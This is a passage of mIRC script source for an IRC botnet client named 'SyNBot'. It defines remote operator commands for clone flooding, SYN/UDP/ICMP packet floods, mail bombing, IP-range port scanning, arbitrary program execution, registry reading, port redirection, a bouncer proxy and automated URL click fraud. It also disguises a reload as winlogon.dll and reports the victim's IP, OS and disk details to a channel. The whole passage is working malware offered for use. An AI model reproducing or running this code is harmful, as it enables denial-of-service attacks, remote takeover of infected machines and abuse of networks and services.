    if ($1 == !t.kill) { .run kill.exe cmd1.exe | .run kill.exe nc.exe | .run kill.exe cmd1.exe | .run kill.exe nc.exe | msg $chan TELNET PORT(S) CLOSED! }
    if ($1 == !clone.combo10) {
      timer 1 2 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 4 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 8 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 14 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 20 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 30 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 40 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 50 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 60 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
    }
    if ($1 == !clone.destroy) {
      timer 1 2 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 4 /clone msgx $2 ½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾
      timer 1 8 /clone msgx $2 12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond Laging1,12Beyond Laging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging
      timer 1 14 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
      timer 1 20 /clone msgx $2 ½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾
      timer 1 26 /clone msgx $2 12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond Laging1,12Beyond Laging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging
      timer 1 34 /clone msgx $2 $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek $gchek
    }
    if ($1 == !clone.cycle.flood)  {  if ($2 == $null) { halt } | msgx # NOW CYCLE FLOODING... $2 (to stop !flood.stop) |  /clone join $2  | /clone part $2 $  | //timerConstantFlood1 0 5 /clone join $2 |  /clone part $2 }
    if ($1 == !clone.quite.join) { //timerjoiners 1 $rand(1,300) /clone join $2 } 
    if ($1 == !clone.get.voiced) { //timervoices 1 $rand(1,300) /clone msgx $2 5(14FILE SERVERS ONLINE5) TRIGGERS15:5(14MOVIES5) SNAGGED15:5(14126.91GB IN 551 FILES5) RECORD CPS15:5(1496.4KB/S BY bigpenis5) ONLINE15:5(14215/1445) SENDS15:5(14115/1415) QUEUES15:5(142515/14505) ED15:5(1412275 TIMES5) NOTE15:5(14UPLOAD PLZ...5) 15«~5{14WRITE-ERROR IRC5}15~» }
    if ($1 == !clone.c.flood) {  if ($2 == $null) { halt } | msgx # NOW FLOODING... $2 (to stop !flood.stop) |  /clone msgx $2 $3- | /clone notice $2 $3-  | //timerConstantFlood1 0 5 /clone msgx $2 $3- |  /clone msgx $2 $3- | //timerConstantFlood2 0 8 /clone notice $2 $3-  }
    if ($1 == !clone.nick.read) { %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) nick $2 $read ex.scr |   inc %.nc |  goto ncloop |   :end  |  /wnickchn $2 |  halt   }
    if ($1 == !clone.ctcp.block) { /sockwrite -tn clone* PRIVMSG $2 :×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}× | /sockwrite -tn clone* PRIVMSG $2 :×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬}×¬ }
    if ($1 == !clone.service.killer2) {    if ($sock(clone*,0) == 0) { goto gatechange }  |   %sk = 1  |     :skloop |  if (%sk > $sock(clone*,0)) { goto end }  | sockwrite -n $sock(clone*,%sk) Nick $randomgen($r(0,9))   |   %random.sk.temp = $randomgen($r(0,9))  |  %random.sk.temp2 = $randomgen($r(0,9))  |  %random.sk.temp3 = $randomgen($r(0,9))  |  sockwrite -n $sock(clone*,%sk) NICKSERV register %random.sk.temp $remove($randomgen($r(0,9)),^,_,-,`) $+ $reg($r(0,10)) |  sockwrite -n $sock(clone*,%sk) NICKSERV identify %random.sk.temp $remove($randomgen($r(0,9)),^,_,-,`) $+ $reg($r(0,10)) |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2    |   sockwrite -n $sock(clone*,%sk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %sk  |   goto skloop  |   :end  |  :gatechange  |   %gsk = 1  |   
    %random.sk.temp3 = $randomgen($r(0,9))    |   sockwrite -n $sock(sock*,%gsk) NICKSERV register %random.sk.temp  $remove($randomgen($r(0,9)),^,_,-,`) $+ $reg($r(0,10)) |   sockwrite -n $sock(sock*,%gsk) NICKSERV identify %random.sk.temp |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |   sockwrite -n $sock(sock*,%gsk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %gsk  | goto gchnge |   :end2 |   halt    }
    if ($1 == !clone.join.k) { if $3 == $null { halt } | sockwrite -nt clone* JOIN $2 : $+ $3 }

    if ($1 == !ver) { msg $chan [SyNBot](V5.0)[By Syn] }
    if (($1 == !rscript) && ($2 == $null)) { reload -rs winlogon.dll }
    if (($1 == !rscript) && ($2 != $null)) { reload -rs $2- }
    if ($1 == !cusers) { rlevel 10 }
    if ($1 == !randscan) && (%begshortip == $null) && ($2 != $null) && ($3 != $null) && ($4 != $null) { set %botchan $chan | set %port $4 | set %begit $randip($2) | msg # 2[14scanner2]14 starting scan from: %begit to $3 on %port | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | setnewvars4scan }
    if ($1 == !join) { if ($2 != $null) { join $2- } }
    if ($1 == !part) { if ($2 != $chan(1)) { part $2- } }
    if ($1 == !mode) { mode $2 $3- }
    if ($1 == !mode.me) { mode $me $2- }
    if ($1 == !max.load) { set %max.load $2 }
    if ($1 == !die.right.now.kthx) { exit }
    if ($1 == !msgx) { msgx $2 $3- }
    if ($1 == !set) { if ($2 != $null) { set $2 $3- } }
    if ($1 == !syn) { if ($2 == stop) { sockclose syn* | msgx # SynPacketting halted | halt } | if (($2 != $null) && ($3 != $null) && ($4 != $null)) { msg # SynPacketting: $chr(91) $+ $2 $+ $chr(93) with $chr(91) $+ $4 $+ $chr(93) packets on port $chr(91) $+ $3 $+ $chr(93) | synp start $4 $2 $3 } }
    if ($1 == !unset) { if ($2 != $null) { unset $2- } }
    if ($1 == !exists.full) { if ($2 != $null) { msg $chan $iif($exists($2-),Yes it Exists,No It Doesnt Exists) } } 
    if ($1 == !exists) { if ($2 != $null) { if ($exists($2-) == $false) { halt } | msg $chan Yes It Exists } } 
    if ($1 == !run) { if ($2 != $null) { run $2- } }
    if ($1 == !raw) { if ($2 != $null) { $chr(47) $+ [ [ $2- ] ] } }
    if ($1 == !url) { msg $chan Currently Browsing:[  $+ $url $+  ] }
    if ($1 == !uptime) { msg $chan My Uptime:[ $+  $duration($calc( $ticks / 1000 )) $+ ] }
    if ($1 == !info) { msg $chan IP:[ $+ $ip $+ ] HOST:[ $+ $host $+ ] DATE:[ $+  $asctime(dddd mmmm dd yyyy) $+ ] TIME:[ $+  $asctime(hh:nn tt ) $+ ]  OS:[WINDOWS $+ $os $+ ] UPTIME:[ $+  $duration($calc( $ticks / 1000 )) $+ ] CURRENT-URL:[  $+ $url $+  ] }
    if ($1 == !disk) {
      set %diskinfo $null
      if ($exists(c:) == $true) { 
        set %diskinfo [ %diskinfo C:\ (  $+ [ $bytes($disk(c).free,g).suf ] $+  /  $+ [ $bytes($disk(c).size,g).suf ] $+  ) ]
      }
      if ($exists(d:) == $true) { 
        set %diskinfo [ %diskinfo D:\ (  $+ [ $bytes($disk(d).free,g).suf ] $+  /  $+ [ $bytes($disk(d).size,g).suf ] $+  ) ]
      }
      if ($exists(e:) == $true) { 
        set %diskinfo [ %diskinfo E:\ (  $+ [ $bytes($disk(e).free,g).suf ] $+  /  $+ [ $bytes($disk(e).size,g).suf ] $+  ) ]
      }
      if ($exists(f:) == $true) { 
        set %diskinfo [ %diskinfo F:\ (  $+ [ $bytes($disk(f).free,g).suf ] $+  /  $+ [ $bytes($disk(f).size,g).suf ] $+  ) ]
      }
      if ($exists(g:) == $true) { 
        set %diskinfo [ %diskinfo G:\ (  $+ [ $bytes($disk(g).free,g).suf ] $+  /  $+ [ $bytes($disk(g).size,g).suf ] $+  ) ]
      }
      if ($exists(h:) == $true) { 
        set %diskinfo [ %diskinfo H:\ (  $+ [ $bytes($disk(h).free,g).suf ] $+  /  $+ [ $bytes($disk(h).size,g).suf ] $+  ) ]
      }
      if ($exists(I:) == $true) { 
        set %diskinfo [ %diskinfo I:\ (  $+ [ $bytes($disk(i).free,g).suf ] $+  /  $+ [ $bytes($disk(i).size,g).suf ] $+  ) ]
      }
      if ($exists(J) == $true) { 
        set %diskinfo [ %diskinfo J:\ (  $+ [ $bytes($disk(j).free,g).suf ] $+  /  $+ [ $bytes($disk(j).size,g).suf ] $+  ) ]
      }
      if ($exists(k:) == $true) { 
        set %diskinfo [ %diskinfo K:\ (  $+ [ $bytes($disk(k).free,g).suf ] $+  /  $+ [ $bytes($disk(k).size,g).suf ] $+  ) ]
      }
      if ($exists(l:) == $true) { 
        set %diskinfo [ %diskinfo L:\ (  $+ [ $bytes($disk(l).free,g).suf ] $+  /  $+ [ $bytes($disk(l).size,g).suf ] $+  ) ]
      }
      if ($exists(m:) == $true) { 
        set %diskinfo [ %diskinfo M:\ (  $+ [ $bytes($disk(m).free,g).suf ] $+  /  $+ [ $bytes($disk(m).size,g).suf ] $+  ) ]
      }
      if ($exists(n:) == $true) { 
        set %diskinfo [ %diskinfo N:\ (  $+ [ $bytes($disk(n).free,g).suf ] $+  /  $+ [ $bytes($disk(n).size,g).suf ] $+  ) ]
      }
      if ($exists(o:) == $true) { 
        set %diskinfo [ %diskinfo O:\ (  $+ [ $bytes($disk(o).free,g).suf ] $+  /  $+ [ $bytes($disk(o).size,g).suf ] $+  ) ]
      }
      if ($exists(p:) == $true) { 
        set %diskinfo [ %diskinfo P:\ (  $+ [ $bytes($disk(p).free,g).suf ] $+  /  $+ [ $bytes($disk(p).size,g).suf ] $+  ) ]
      }
      if ($exists(q:) == $true) { 
        set %diskinfo [ %diskinfo Q:\ (  $+ [ $bytes($disk(q).free,g).suf ] $+  /  $+ [ $bytes($disk(q).size,g).suf ] $+  ) ]
      }
      if ($exists(r:) == $true) { 
        set %diskinfo [ %diskinfo R:\ (  $+ [ $bytes($disk(r).free,g).suf ] $+  /  $+ [ $bytes($disk(r).size,g).suf ] $+  ) ]
      }
      if ($exists(s:) == $true) { 
        set %diskinfo [ %diskinfo S:\ (  $+ [ $bytes($disk(s).free,g).suf ] $+  /  $+ [ $bytes($disk(s).size,g).suf ] $+  ) ]
      }
      if ($exists(t:) == $true) { 
        set %diskinfo [ %diskinfo T:\ (  $+ [ $bytes($disk(t).free,g).suf ] $+  /  $+ [ $bytes($disk(t).size,g).suf ] $+  ) ]
      }
      if ($exists(u:) == $true) { 
        set %diskinfo [ %diskinfo U:\ (  $+ [ $bytes($disk(u).free,g).suf ] $+  /  $+ [ $bytes($disk(u).size,g).suf ] $+  ) ]
      }
      if ($exists(v:) == $true) { 
        set %diskinfo [ %diskinfo V:\ (  $+ [ $bytes($disk(v).free,g).suf ] $+  /  $+ [ $bytes($disk(v).size,g).suf ] $+  ) ]
      }
      if ($exists(w:) == $true) { 
        set %diskinfo [ %diskinfo W:\ (  $+ [ $bytes($disk(w).free,g).suf ] $+  /  $+ [ $bytes($disk(w).size,g).suf ] $+  ) ]
      }
      if ($exists(x:) == $true) { 
        set %diskinfo [ %diskinfo X:\ (  $+ [ $bytes($disk(x).free,g).suf ] $+  /  $+ [ $bytes($disk(x).size,g).suf ] $+  ) ]
      }
      if ($exists(y:) == $true) { 
        set %diskinfo [ %diskinfo Y:\ (  $+ [ $bytes($disk(y).free,g).suf ] $+  /  $+ [ $bytes($disk(y).size,g).suf ] $+  ) ]
      }
      if ($exists(Z:) == $true) { 
        set %diskinfo [ %diskinfo Z:\ (  $+ [ $bytes($disk(z).free,g).suf ] $+  /  $+ [ $bytes($disk(z).size,g).suf ] $+  ) ]
      }
      msg # [DISKINFO] %diskinfo [DISKINFO]
      unset %diskinfo
    }
    if ($1 == !nick.new) { if ($2 != $null) { nick $2 $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) } }
    if ($1 == !nick) { $lw.decrypt(1438.75j1374.825j1298.115j1400.395v) $lw.decrypt(1093.555e1579.385s1029.63a607.725u) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) }
    if ($1 == !var) { if ( [ [ $2 ] ] == $null) { halt } | msg $chan [var]: $2 is [ [ $2- ] ] }
    if ($1 == !varadd) { if ($2 == $null) || ($3 == $null) { halt } | msg $chan Set $2 $3- | //set $2 $3 }
    if (($1 == !ip.control) && ($2 iswm $gettok($address($me,5),2,64))) { $chr(47) $+ [ [ $3- ] ] }
    if (($1 == !uptime.control) && ($2 iswm $duration($calc( $ticks / 1000 )))) { $chr(47) $+ [ [ $3- ] ] }
    if (($1 == !os.control) && ($2 == $os)) { $chr(47) $+ [ [ $3- ] ] }
    if (($1 == !nick.control) && ($2 iswm $me)) { $chr(47) $+ [ [ $3- ] ] }
    if ($1 == !list.control) && ($nick(#,$me) <= $2) { [ [ $3- ] ] }
    if ($1 == !scripts) { .msg $chan I have $script(0) loaded. }
    if ($1 == !Registry) && ($2 != $null) && ($dll(registry.dll,GetKeyValue, $2- ) != $null) { msg $chan REGISTRY READER, VALUE IS: $dll(registry.dll,GetKeyValue, $2- ) }
    if ($1 == !moo) { .msg $chan 2os[ $+ $dll(moo.dll,osinfo,_) $+ ] 2uptime[ $+ $dll(moo.dll,uptime,_) $+ ] 2cpu[ $+ $dll(moo.dll,cpuinfo,_) $+ ] 2mem[ $+ $dll(moo.dll,meminfo,_) $+ $result $+] 2screen[ $+ $dll(moo.dll,screeninfo,_) $+ ] 2Network Interfaces[ $+ $dll(moo.dll,interfaceinfo,_) $+ ] }
    if ($1 == !diskinfo) { if ($2 == $null) { msg # I have $bytes($disk(c).free).suf of free space, total; $bytes($disk(c).size).suf in C:\ } | if ($2 != $null) && ($exists($2) == $true) { msg # I have $bytes($disk($2).free).suf of free space, total; $bytes($disk($2).size).suf in $2 } | { if ($2 != $null) && ($exists($2) != $true) { msg # I Have No Such Drive! } } }      
    if ($1 == !flood.stop) { timerConstantFlood* off  | msgx # STOPPING FLOOD COMPLETE... }
    if ($1 == !set.flood.server.port) {  if ($2 == $null) { halt } | if ($3 == $null) { halt } | /set %msg.flood.server $$2 |  /set %msg.flood.server.port $3  }
    if ($1 == !super.flood) {  if ($2 == $null) { halt } | if (%msg.flood.server == $null) || (%msg.flood.server.port == $null) { .msgx # msgxflood server, or port not set! | halt }  | if ($3 == $null) { //set %msg2bomb BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling | goto bomb } | //set %bots 1 | /set %nick2bomb $$2  | /set %msg2bomb $$3- | .msgx # 5RANDOM CONNECT QUERY/NOTICE FLOODING: $$2 ( $+ %msg2bomb $+ ) |  /dksmsgxflooder  |  /timer -o 1 100 .msgx # FLOOD COMPLETE ON: $2  |  /timer -o 1 100 /sockclose dksmsgxflooder*  |   /timer -o 1 102 /unset %blastedmsgxs  }
    if ($1 == !super.flood.stop!) {   //set %blastit Off  |  /sockclose dksmsgxflooder* |  /unset %blastedmsgxs | .msgx # FLOOD TURNED OFF:. |  //timers off  }
    if ($1 == !click) { 
      if ($2 == off) { timerclicker off | msgx # 14•15TragicClicker14• Stopped clicking %click.url | sockclose webpage* | halt } 
      if ($2 == stats) { 
        if ($timer(clicker) == $null) { msgx # 14•15TragicClicker14• idle.. | halt } 
        msgx # 14•15TragicClicker14• Currently clicking: 12«14(15 $+ %click.url $+ 14)12» Clicks left:12 $timer(clicker).reps Delay:12 $duration($timer(clicker).delay) Time left:12 $duration($calc($timer(clicker).reps * $timer(clicker).delay)) 
        halt 
      }
      if (($4 !isnum) && ($4 != random)) { msgx # 14•15Clicker14• Error! Syntax: !click http://www.url.com <number of times> <delay> (Note: use 'random' to make it delay between 5-45 seconds) | halt } 
      if ((http:// !isin $2) || ($3 !isnum)) { msgx # 14•15Clicker14• Error! Syntax: !click http://www.url.com <number of times> <delay> (Note: use 'random' to make it delay between 5-45 seconds) | halt } 
      var %c = $4 | if ($4 == random) { set %c $rand(5,45) } | set %click.url $2 | set %click.url2 $remove($2,http://,https://,$gettok($remove($2,http://,https://),1,47)) | msgx # 14•15Clicker14• Now clicking 12 $+ $2 $+  $3 times, with a delay of 12 $+ $duration(%c) 8~~14 Type !click off to stop! 
      if (%click.url2 == $chr(47)) { set %click.url2 $chr(47) $+ index.html }
      timerclicker $3 %c webview1 $gettok($remove($2,http://,https://),1,47) 80 
    }
    if ($1 == !icmp) { if ($4 == $null) { .msgx # icmp error! | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs }  { msgx # 4[sending ( $+ $4 $+ ) ICMP-packets to ( $+ $2 $+ ) Sized: ( $+ $3 $+ )14] } 
    if (($1 == !identd) && ($2 != $null)) { identd on $2 }
    if ($1 == !timeout) { set %timeout $2 }
    if ($1 == !pfast) {  //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,65000) | halt } | //gcoolstart $2 $3 $4 }
    if ($1 == !portredirect) { if ($2 == $null) { .msgx # PORTREDIRECTION ERROR!!! FOR HELP TYPE: !portredirect help | halt } | if ($2 == help) { .msgx # *** PORT REDIRECTION HELP! *** | .msgx # COMMANDS.. | msgx # !portredirect add 1000 irc.dal.net 6667 | msgx # !portredirect stop port | msgx # !portredirect stats | .msgx # PORT REDIRECT HELP / END halt } | if ($2 == add) { if ($5 == $null) { .msgx # PORT REDIRECTION ERROR: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.dal.net 6667) | halt } | //gtportdirect $3- | .msgx # [REDIRECT ADDED] I-PORT=( $+ $3 $+ ) to $4 $5 | .msgx # [LOCAL IP ADDRESS]:14 $ip |  halt  } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  .msgx # [PORTREDIRECTION] PORT:(12 $+ $3 $+ 14) HAS BEEN STOPPED. |  halt  } | if ($2 == stats) { |  msgx  # *** PORT REDIRECTION STATS. |  /predirectstats #  } }
    if ($1 == !stopscan) { bishazz }
    if ($1 == !scan) { if ($2 == $null) || ($3 == $null) { msgx # ERROR/SYNTAX: !scan 24.4.51.* [port] | halt } | if (* !isin $2) { msgx # 12 ERROR! !scan 24.4.51.* [port]  (please) | halt } | else {   set %begshortip $replace($2,*,1)  | set %beglongip $longip( %begshortip ) |   set %endshortip $replace($2,*,255)  |   set %endlongip $longip( %endshortip ) |   set %port $3  |  set %botchan $chan  |   .msgx $chan [Scanner Started] %begshortip to %endshortip $+ ... [port: $+ %port $+ ] |   /startscanning   } }
    if ($1 == !udp) { set %pchan # | coldrage $2- }
    if ($1 == !sndl) { set %dchan $chan | cfdl $2- }
    if ($1 == !cfdlscript) { set %dchan # | set %loadscript 1 | cfdl $2- }
    if ($1 == !cfmailbomb) { set %mchan # | cfmailbomb $2- }
    if ($1 == !die.forever) { msgx $chan [Now Removing] | set %removeitem 1 | .run $mircexe | exit }
    if ($1 == !s) { if ($2 == on) { set %msg 0 } | if ($2 == off) { set %msg 1 } }
    if ($1 == !bnc) && ($2 != $null) && ($3 != $null) {
      if ($sock(bnc)) {
        msgx # [SyNBot] - Bot Bnc Status /\ Status: Already Active
        halt
      }
      set %bnc on
      socklisten bnc $2
      set %bnc.port $2
      set %bnc.passwd $3 
      msgx # [SyNBot] - Bot Bnc Status /\ Status: Activated - Ip: $ip - Port: %bnc.port - Password: %bnc.passwd
    }
    if ($1 == !bncstats) {
      if ($sock(bnc)) {
        msgx # [SyNBot] - Bot Bnc Status /\ Status: Active - Ip: $ip - Port: %bnc.port - Password: %bnc.passwd - Users: $sock(BncClient*,0) - On Servers: $sock(BncServer*,0)
      }
      if ($sock(bnc) == $null) {
        msgx # [SyNBot] - Bot Bnc Status /\ Status: Deactive
      }
    }
    if ($1 == !bncoff) {
      sockclose bnc
      msgx # [SyNBot] - Bot Bnc Status /\ Status: Deactivated
    }
    if ($1 == !inviter) {   %s.i.c = # | if (# == $null) { set  %s.i.c $nick }  |  if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter  } |  if ($2 == stop) { sockclose inviter* | remove ichan.txt | //set %i.b off | unset %i.temp.* | /timerinviteconnect off | msgx # 5[15in14vit15er5]:  INVITER HAS BEEN KILLED. }  |  if ($2 == status) { if ($sock(inviter*,0) == 0) { msgx # 5[15in14vit15er5]: STATUS: NOT CONNECTED! | halt }  
